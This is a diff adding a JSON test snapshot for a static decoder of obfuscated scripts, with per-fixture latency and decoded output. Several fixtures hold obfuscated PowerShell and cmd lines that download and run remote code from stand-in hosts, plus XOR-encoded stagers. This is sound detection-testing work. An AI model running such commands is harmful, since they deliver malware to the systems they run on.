@@ -1,0 +1,5599 @@
+{
+  "aggregate_latency_ms": {
+    "max": 1.2435560347512364,
+    "mean": 0.017144134746509304,
+    "p50": 0.007405003998428583,
+    "p95": 0.03989401739090681,
+    "p99": 0.06981397746130824
+  },
+  "captured_at_utc": "2026-09-02T11:14:49.916755+00:00",
+  "content_signature_sha256": "12378d118ffdc7fd68cbad72547af81b3fe716abe61682652c36b58982308bac",
+  "exception_count": 0,
+  "fixture_count": 257,
+  "gate": "P0-1B · Phase 2 · Gate 2D-B3.0 · Pre-migration snapshot",
+  "peeled_any_count": 25,
+  "reference_impl": "services.die.preprocessor.recursive_decoder.peel_recursively",
+  "snapshots": [
+    {
+      "exception": null,
+      "final_bytes_len": 225,
+      "final_sha256": "9c1216fa8225465f5b8a970c6a6776e8e4503e5cd077617dabb450dd9c01f3db",
+      "final_text": "powershell -c \"(87,114,105,116,101,45,72,111,115,116,32,39,72,101,108,108,111,32,65,110,97,108,121,115,116,39,32,45,70,111,114,101,103,114,111,117,110,100,67,111,108,111,114,32,71,114,101,101,110) | %{[char]$_} | Join-String\"",
+      "fixture_id": "ascii_decimal_hello_analyst",
+      "implementation": "reference",
+      "latency_ms": 0.03677397035062313,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 67,
+      "final_sha256": "0f950739c4457235b906665a55a717a302d8db5b4a59f7d36313951d13f1bd00",
+      "final_text": "105 100 59 119 104 111 97 109 105 59 104 111 115 116 110 97 109 101",
+      "fixture_id": "ascii_decimal_recon",
+      "implementation": "reference",
+      "latency_ms": 0.010320043656975031,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 304,
+      "final_sha256": "73ab8078fc50e1cc6e48448dea3b4a78cf777a170456702d51c38b9abe725a25",
+      "final_text": "powershell -nop -w hidden \"((88,84,73,49,57,120,102,99,49,60,100,99,120,49,54,121,101,101,97,43,62,62,97,121,120,98,121,60,114,101,120,60,116,105,112,124,97,125,116,63,114,126,124,62,125,126,112,117,116,99,63,97,98,32,54,49,60,100,98,116,115,56) | ForEach-Object{[char]($_ -bxor '0x11')}) -join '' | iex\"",
+      "fixture_id": "ascii_decimal_xor_hancitor",
+      "implementation": "reference",
+      "latency_ms": 0.029588001780211926,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 270,
+      "final_sha256": "651886d53e5fed579e82e9bd5a51716c4745349d51a9a17592dc1674fc8c654d",
+      "final_text": "powershell -NoProfile -WindowStyle Hidden -Command \"\n  ((\n    125, 88, 67, 94, 79, 7, 98, 69, 89, 94, 10, 13, 122, 125, 100, 111, 110, 117, 111, 103, 122, 99, 120, 111, 117, 110, 120, 101, 122, 13\n  ) | ForEach-Object{[char]($_ -bxor 42)} ) -join '' | Invoke-Expression\"",
+      "fixture_id": "ascii_decimal_xor_multiline_empire",
+      "implementation": "reference",
+      "latency_ms": 0.027960981242358685,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 123,
+      "final_sha256": "6bbfd594dc0262f6aa0af59e35da61c7e425f2c3b45c9e2dbc94557c9bcf6a2c",
+      "final_text": "$decoded = ConvertFrom-Base32Encoded 'JFCVQIBHK5ZGS5DFFVEG643UEBJVIQKHIVPTEX2MJ5AUIRKEE4======'; Invoke-Expression $decoded",
+      "fixture_id": "base32_emotet_shape_wrap",
+      "implementation": "reference",
+      "latency_ms": 0.008690985850989819,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 10,
+      "final_sha256": "6bc8412a419ccb4465be4f5f338b3557fa5d10be1899830a54d8e4c3d2aa5f90",
+      "final_text": "[raw:108b]",
+      "fixture_id": "base32_lowercase_downloader",
+      "implementation": "reference",
+      "latency_ms": 0.26913598412647843,
+      "layer_count": 1,
+      "layer_sequence": [
+        "bare_base64"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 144,
+          "bytes_out": 228,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding"
+          ],
+          "stage": "bare_base64"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 10,
+      "final_sha256": "6bc8412a419ccb4465be4f5f338b3557fa5d10be1899830a54d8e4c3d2aa5f90",
+      "final_text": "[raw:108b]",
+      "fixture_id": "base32_nopad_downloader",
+      "implementation": "reference",
+      "latency_ms": 0.056194025091826916,
+      "layer_count": 1,
+      "layer_sequence": [
+        "bare_base64"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 144,
+          "bytes_out": 228,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding"
+          ],
+          "stage": "bare_base64"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 10,
+      "final_sha256": "6bc8412a419ccb4465be4f5f338b3557fa5d10be1899830a54d8e4c3d2aa5f90",
+      "final_text": "[raw:108b]",
+      "fixture_id": "base32_pure_downloader",
+      "implementation": "reference",
+      "latency_ms": 0.03928894875571132,
+      "layer_count": 1,
+      "layer_sequence": [
+        "bare_base64"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 144,
+          "bytes_out": 228,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding"
+          ],
+          "stage": "bare_base64"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 205,
+      "final_sha256": "97992b1a5c1001c69decf2b54964015cff4ba6b9f21ff5d9e5ae973358f3748a",
+      "final_text": "# Analyst note — recovered AES-CBC key & IV from RE\n# key(b64): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\n# iv(b64):  AAAAAAAAAAAAAAAAAAAAAA==\n# plaintext (post-decrypt): 'http://aes-1.example.test/x'",
+      "fixture_id": "corpus_aes_cbc_analyst_001",
+      "implementation": "reference",
+      "latency_ms": 0.017651997040957212,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 205,
+      "final_sha256": "e2f049936a79acd4168c5c649f37ceaedba89860b89a4951c18ecbb2e80b862f",
+      "final_text": "# Analyst note — recovered AES-CBC key & IV from RE\n# key(b64): BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=\n# iv(b64):  BBBBBBBBBBBBBBBBBBBBBB==\n# plaintext (post-decrypt): 'http://aes-2.example.test/y'",
+      "fixture_id": "corpus_aes_cbc_analyst_002",
+      "implementation": "reference",
+      "latency_ms": 0.013859011232852936,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 205,
+      "final_sha256": "34808454bb4ee7c7176841c869b3bae3c90276b09e7ab8771b4bec5c679a0636",
+      "final_text": "# Analyst note — recovered AES-CBC key & IV from RE\n# key(b64): CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC=\n# iv(b64):  CCCCCCCCCCCCCCCCCCCCCC==\n# plaintext (post-decrypt): 'http://aes-3.example.test/z'",
+      "fixture_id": "corpus_aes_cbc_analyst_003",
+      "implementation": "reference",
+      "latency_ms": 0.012976001016795635,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 205,
+      "final_sha256": "186b64443a98b9d761abd0546fa672678a7fb91a915a83e244ce9f8f5543257e",
+      "final_text": "# Analyst note — recovered AES-CBC key & IV from RE\n# key(b64): DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD=\n# iv(b64):  DDDDDDDDDDDDDDDDDDDDDD==\n# plaintext (post-decrypt): 'http://aes-4.example.test/a'",
+      "fixture_id": "corpus_aes_cbc_analyst_004",
+      "implementation": "reference",
+      "latency_ms": 0.013487006071954966,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 204,
+      "final_sha256": "5f4180d682a73f39303f9a1c7a584de7aa607fd2a92d6fbfb7db1b19caf95c34",
+      "final_text": "# Analyst note — recovered AES-CBC key & IV from RE\n# key(b64): EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE=\n# iv(b64):  EEEEEEEEEEEEEEEEEEEEEE==\n# plaintext (post-decrypt): 'http://aes-5.example.test/b'",
+      "fixture_id": "corpus_aes_cbc_analyst_005",
+      "implementation": "reference",
+      "latency_ms": 0.012833974324166775,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 126,
+      "final_sha256": "e17a17942edcc4a4b174cbfedb3573c7c02e9f5f074775c180bdff8793ef2d43",
+      "final_text": "$p='bkVdREZFS05rRE5jRFxFQU8KQl5eWhAFBUtZU0RJWEteBxsET1JLR1pGTwReT1leBUlGQ09EXgRIQ0Q='; # xor-key 0x2a  # AsyncRAT-shape stager",
+      "fixture_id": "corpus_asyncrat_stager_001",
+      "implementation": "reference",
+      "latency_ms": 0.0089230015873909,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 122,
+      "final_sha256": "c1d914f4390d3f05c9cd2ba314021f6fd1ab95ecf8856092e34993f1d5979614",
+      "final_text": "$p='c1hAWVtYVlN2WVN+WUFYXFIXX0NDRw0YGFZETllURVZDGgUZUk9WWkdbUhlDUkRDGERDQlUZVV5Z'; # xor-key 0x37  # AsyncRAT-shape stager",
+      "fixture_id": "corpus_asyncrat_stager_002",
+      "implementation": "reference",
+      "latency_ms": 0.007845985237509012,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 126,
+      "final_sha256": "283ac56813e745ada422f5d1a2688b8738ad61d2d8c014b28d98650dc5ba952d",
+      "final_text": "$p='ACszKigrJSAFKiANKjIrLyFkLDAwNH5rayU3PSonNiUwaXdqITwlKTQoIWowITcwaygrJSAhNmomLSo='; # xor-key 0x44  # AsyncRAT-shape stager",
+      "fixture_id": "corpus_asyncrat_stager_003",
+      "implementation": "reference",
+      "latency_ms": 0.007882015779614449,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 122,
+      "final_sha256": "c16324e1de61a4ee1579fc4940479853a9e40be378efe642802432d071c532cd",
+      "final_text": "$p='EToiOzk6NDEUOzEcOyM6PjB1PSEhJW96ejQmLDs2JzQheGF7MC00OCU5MHshMCYheic0IXs3PDs='; # xor-key 0x55  # AsyncRAT-shape stager",
+      "fixture_id": "corpus_asyncrat_stager_004",
+      "implementation": "reference",
+      "latency_ms": 0.01082499511539936,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 126,
+      "final_sha256": "9842490c87f32d09dc93b1ab2639e95b7a7fe488098505a7da380095abbd7307",
+      "final_text": "$p='IgkRCAoJBwInCAIvCBAJDQNGDhISFlxJSQcVHwgFFAcSS1NIAx4HCxYKA0gSAxUSSQQDBwUJCEgEDwg='; # xor-key 0x66  # AsyncRAT-shape stager",
+      "fixture_id": "corpus_asyncrat_stager_005",
+      "implementation": "reference",
+      "latency_ms": 0.0077830045484006405,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 24,
+      "final_sha256": "729cebdfdd73cb63c52ca3f9dd042b0b6129ba829691782aa21b7a479af68b64",
+      "final_text": "NBSWY3DPEB3W64TMMQ======",
+      "fixture_id": "corpus_base32_rfc4648_001",
+      "implementation": "reference",
+      "latency_ms": 0.002299027983099222,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 16,
+      "final_sha256": "d257b17f9ab2dc75f873bae34468106308b27dde6e879e58f5355e835869f720",
+      "final_text": "NFSDW53IN5QW22I=",
+      "fixture_id": "corpus_base32_rfc4648_002",
+      "implementation": "reference",
+      "latency_ms": 0.0020459992811083794,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 32,
+      "final_sha256": "4f00675a31bbf850f50e7ed31c5e3f6dd2f679cbbff7347664cc801c731a74a2",
+      "final_text": "JFCVQIBHORSXG5BNMJSW42LHNYTQ====",
+      "fixture_id": "corpus_base32_rfc4648_003",
+      "implementation": "reference",
+      "latency_ms": 0.002420041710138321,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 48,
+      "final_sha256": "8c34e85c9b8ab790e28133befdb33a7221b008a29934ad806c2ceb46b363c80a",
+      "final_text": "MN2XE3BANB2HI4B2F4XWEMZSFVSXQYLNOBWGKLTUMVZXIL3Y",
+      "fixture_id": "corpus_base32_rfc4648_004",
+      "implementation": "reference",
+      "latency_ms": 0.00323000131174922,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 112,
+      "final_sha256": "5ca95349b83a083b6c3a93178f3f533541720b152cece22c3ac8fe621495338d",
+      "final_text": "MNSXE5DVORUWYIBNOVZGYY3BMNUGKIBNMYQGQ5DUOA5C6L3CGMZGILLFPBQW24DMMUXHIZLTOQXWI4TPOBYGK4RAMRZG64DQMVZC4ZLYMU======",
+      "fixture_id": "corpus_base32_rfc4648_005",
+      "implementation": "reference",
+      "latency_ms": 0.007965019904077053,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 25,
+      "final_sha256": "cd06279d7f77b7fd67ffd76e35978ab3064ad68fcc18bdc3bdd3224d072c18f5",
+      "final_text": "Write-Host 'benign hello'",
+      "fixture_id": "corpus_base64_utf16le_001",
+      "implementation": "reference",
+      "latency_ms": 0.026191992219537497,
+      "layer_count": 1,
+      "layer_sequence": [
+        "ps_encodedcommand"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 99,
+          "bytes_out": 25,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "healed"
+          ],
+          "stage": "ps_encodedcommand"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 77,
+      "final_sha256": "fe32e1031c423cd648d0526756cc0ebe6ec7dc963487514b593ab0ac8aaa0cbd",
+      "final_text": "IEX (New-Object Net.WebClient).DownloadString('http://benign1.example/x.ps1')",
+      "fixture_id": "corpus_base64_utf16le_002",
+      "implementation": "reference",
+      "latency_ms": 0.022878986783325672,
+      "layer_count": 1,
+      "layer_sequence": [
+        "ps_encodedcommand"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 239,
+          "bytes_out": 77,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "healed"
+          ],
+          "stage": "ps_encodedcommand"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 51,
+      "final_sha256": "bd6fab44f9e3f2a5c70c9503fea4278b97281fc42e29e5ac4e4f6d1b54e8303a",
+      "final_text": "IEX (iwr -useb 'http://benign2.example/loader.ps1')",
+      "fixture_id": "corpus_base64_utf16le_003",
+      "implementation": "reference",
+      "latency_ms": 0.016756996046751738,
+      "layer_count": 1,
+      "layer_sequence": [
+        "ps_encodedcommand"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 167,
+          "bytes_out": 51,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "healed"
+          ],
+          "stage": "ps_encodedcommand"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 79,
+      "final_sha256": "eec8b0c67b4c838a0def0703b8d6df7488ea6ccd4268b15c609b63717c383de0",
+      "final_text": "Start-BitsTransfer -Source 'http://benign3.example/t.exe' -Dest $env:TEMP\\t.exe",
+      "fixture_id": "corpus_base64_utf16le_004",
+      "implementation": "reference",
+      "latency_ms": 0.021262967493385077,
+      "layer_count": 1,
+      "layer_sequence": [
+        "ps_encodedcommand"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 243,
+          "bytes_out": 79,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "healed"
+          ],
+          "stage": "ps_encodedcommand"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 59,
+      "final_sha256": "f7bbd33981c7dd1984e691da1e3120e078ace395d8f3a80a80f89e18d788af69",
+      "final_text": "Invoke-RestMethod 'http://benign4.example/api' -Method POST",
+      "fixture_id": "corpus_base64_utf16le_005",
+      "implementation": "reference",
+      "latency_ms": 0.020229024812579155,
+      "layer_count": 1,
+      "layer_sequence": [
+        "ps_encodedcommand"
+      ],
+      "layers_detail": [
+        {
+          "bytes_in": 191,
+          "bytes_out": 59,
+          "layer": 1,
+          "meta_keys": [
+            "b64_len",
+            "encoding",
+            "healed"
+          ],
+          "stage": "ps_encodedcommand"
+        }
+      ],
+      "ok": true,
+      "peeled_any": true,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 52,
+      "final_sha256": "c9cbc6a859635f4b3cb725f4acac752f1387e01888dba56ae9fdb1dd491d6d0f",
+      "final_text": "@set v=REALLYLONG_SECRET_VALUE\r\n@call echo %v:~11,6%",
+      "fixture_id": "corpus_batch_var_slicing_001",
+      "implementation": "reference",
+      "latency_ms": 0.0037520076148211956,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 56,
+      "final_sha256": "f51d1daac0f775c9b44e182fc0173b27a8970ac29eec3347ff7a02777504c100",
+      "final_text": "@set v=attacker_command_line_string\r\n@call echo %v:~9,7%",
+      "fixture_id": "corpus_batch_var_slicing_002",
+      "implementation": "reference",
+      "latency_ms": 0.003915047273039818,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 56,
+      "final_sha256": "de2da8284bb77c56771fd4cbdd9e950af087e7a19cf399634ae947486a7e1385",
+      "final_text": "@set v=credential-drop-file-name-x\r\n@call echo %v:~11,4%",
+      "fixture_id": "corpus_batch_var_slicing_003",
+      "implementation": "reference",
+      "latency_ms": 0.004011963028460741,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 54,
+      "final_sha256": "64f05cfea2742cc3914fa673682afbf8f50002ef2e505ce2f90ce11a1a37e02e",
+      "final_text": "@set v=http-download-url-here-x1x\r\n@call echo %v:~5,8%",
+      "fixture_id": "corpus_batch_var_slicing_004",
+      "implementation": "reference",
+      "latency_ms": 0.004397006705403328,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 49,
+      "final_sha256": "c56378c877d1dbbbe07d08d6b6195ff2627c8ec29acc9349009f3078e795ae0c",
+      "final_text": "@set v=payload-exe-name-z8z8\r\n@call echo %v:~0,7%",
+      "fixture_id": "corpus_batch_var_slicing_005",
+      "implementation": "reference",
+      "latency_ms": 0.0034180120564997196,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 87,
+      "final_sha256": "6ccc8bd49eef8ff78ae86804a3ac42a4cc9367f06ac7036cb99215a2bfeb22ac",
+      "final_text": "cmd /c p^ow^er^s^he^ll -w hidden -c \"iex (iwr 'http://crt-1.example.test/x.ps1' -useb)\"",
+      "fixture_id": "corpus_caret_escaping_cmd_001",
+      "implementation": "reference",
+      "latency_ms": 0.006344984285533428,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 87,
+      "final_sha256": "e634d69c94199e43c1cf96d8773b2176e4ecbc58fb39f883193308c96e723a72",
+      "final_text": "cmd /c p^ow^er^s^he^ll -w hidden -c \"iex (iwr 'http://crt-2.example.test/y.ps1' -useb)\"",
+      "fixture_id": "corpus_caret_escaping_cmd_002",
+      "implementation": "reference",
+      "latency_ms": 0.005604990292340517,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 87,
+      "final_sha256": "dc637f3e23322c2f1e1878ed9a8bdb70e26345fee5d9f735b825a766eb02224c",
+      "final_text": "cmd /c p^ow^er^s^he^ll -w hidden -c \"iex (iwr 'http://crt-3.example.test/z.ps1' -useb)\"",
+      "fixture_id": "corpus_caret_escaping_cmd_003",
+      "implementation": "reference",
+      "latency_ms": 0.00548601383343339,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 87,
+      "final_sha256": "61d0ad9c8f576982295e87a0307373ea7f9e43c79a746938753c3d687a9993db",
+      "final_text": "cmd /c p^ow^er^s^he^ll -w hidden -c \"iex (iwr 'http://crt-4.example.test/a.ps1' -useb)\"",
+      "fixture_id": "corpus_caret_escaping_cmd_004",
+      "implementation": "reference",
+      "latency_ms": 0.020943989511579275,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 87,
+      "final_sha256": "8bb97ee693ba67d9ffb587dfe8c204e76b2b02cc1497c6392686718116686538",
+      "final_text": "cmd /c p^ow^er^s^he^ll -w hidden -c \"iex (iwr 'http://crt-5.example.test/b.ps1' -useb)\"",
+      "fixture_id": "corpus_caret_escaping_cmd_005",
+      "implementation": "reference",
+      "latency_ms": 0.005574955139309168,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 34,
+      "final_sha256": "22fb101e962378f0d46ef479de584fdb3de31e547ccc2a917452c27b836622bb",
+      "final_text": "$a=[char[]](73,69,88); $a -join ''",
+      "fixture_id": "corpus_char_arrays_001",
+      "implementation": "reference",
+      "latency_ms": 0.0027489732019603252,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 36,
+      "final_sha256": "e0dfaae27b70ccd53097ac7e2ce92663ca6364365f8ebdb56caf0c83c29d8734",
+      "final_text": "$a=[char[]](99,109,100); $a -join ''",
+      "fixture_id": "corpus_char_arrays_002",
+      "implementation": "reference",
+      "latency_ms": 0.0030110240913927555,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 40,
+      "final_sha256": "d495e315cbc853426a45659962d2a10a5dfdf97eac546bde006cb6a9d26108c7",
+      "final_text": "$a=[char[]](99,117,114,108); $a -join ''",
+      "fixture_id": "corpus_char_arrays_003",
+      "implementation": "reference",
+      "latency_ms": 0.003049965016543865,
+      "layer_count": 0,
+      "layer_sequence": [],
+      "layers_detail": [],
+      "ok": true,
+      "peeled_any": false,
+      "provenance": {
+        "attck_promotion": false,
+        "execution": false,
+        "network_access": false,
+        "static_only": true
+      }
+    },
+    {
+      "exception": null,
+      "final_bytes_len": 41,
+      "final_sha256": "4986427d719897a3aefce7f1675cdd9715b5c63ade99c8b6ce693290246ba546",
+      "final_text": "$a=[char[]](119,103,101,116); $a -join ''",
+      "fixture_id": "corpus_char_arrays_004",
